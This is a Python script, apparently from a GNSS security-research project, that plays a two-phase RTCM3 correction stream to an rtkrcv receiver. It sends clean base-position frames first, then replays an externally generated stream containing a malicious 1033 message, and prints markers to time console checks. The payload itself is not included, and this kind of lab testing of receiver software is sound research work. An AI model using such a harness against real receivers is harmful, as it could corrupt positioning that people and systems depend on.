#!/usr/bin/env python3
"""
Plays a two-phase RTCM3 correction stream to whatever connects to us --
stands in for the base-station radio link a real rtkrcv would be reading
from (inpstr2, tcpcli).

Phase 1: clean base-position traffic only, for --settle seconds, so the
receiver locks onto the true position before anything attacks it.
Phase 2: the attack stream (a full gen_rtcm.py stream: real 1005 + malicious
1033), repeated for --attack seconds -- same "real base repairs it, attacker
re-sends" pattern used throughout this project.

Prints a single line to stdout at each phase boundary (SETTLED / DONE) so a
driving script can synchronise console queries to it without guessing at
sleep durations.

    rtcm_stream_server.py benign.bin attack.bin [--port 9000]
                                                 [--settle 6] [--attack 15]
"""
import argparse
import socket
import time


def first_frame(stream: bytes) -> bytes:
    """The leading msg1005, split off benign.bin so phase 1 is 1005-only."""
    return stream[:stream.index(b"\xd3", 3)]


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("benign", help="gen_rtcm.py --benign output (1005 + harmless 1033)")
    ap.add_argument("attack", help="gen_rtcm.py output (1005 + malicious 1033)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=9000)
    ap.add_argument("--settle", type=float, default=6, help="seconds of clean 1005 traffic")
    ap.add_argument("--query-pause", type=float, default=5, dest="query_pause",
                    help="extra seconds of continued clean traffic after SETTLED, "
                         "so a driving script has time to query the console before "
                         "attack traffic starts -- without this, a slow query (qemu "
                         "console round-trips are not fast) can race past SETTLED and "
                         "read an already-corrupted 'before' value")
    ap.add_argument("--attack-secs", type=float, default=15, dest="attack_secs",
                    help="seconds of attack traffic")
    args = ap.parse_args()

    clean = first_frame(open(args.benign, "rb").read())
    attack = open(args.attack, "rb").read()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((args.host, args.port))
    srv.listen(1)
    print(f"LISTENING {args.host}:{args.port}", flush=True)

    conn, addr = srv.accept()
    print(f"CONNECTED {addr}", flush=True)

    try:
        t0 = time.time()
        while time.time() - t0 < args.settle:
            conn.sendall(clean)
            time.sleep(1)
        print("SETTLED", flush=True)

        t0 = time.time()
        while time.time() - t0 < args.query_pause:
            conn.sendall(clean)
            time.sleep(1)

        t0 = time.time()
        while time.time() - t0 < args.attack_secs:
            conn.sendall(attack)
            time.sleep(1)
        print("DONE", flush=True)
    finally:
        conn.close()
        srv.close()


if __name__ == "__main__":
    main()
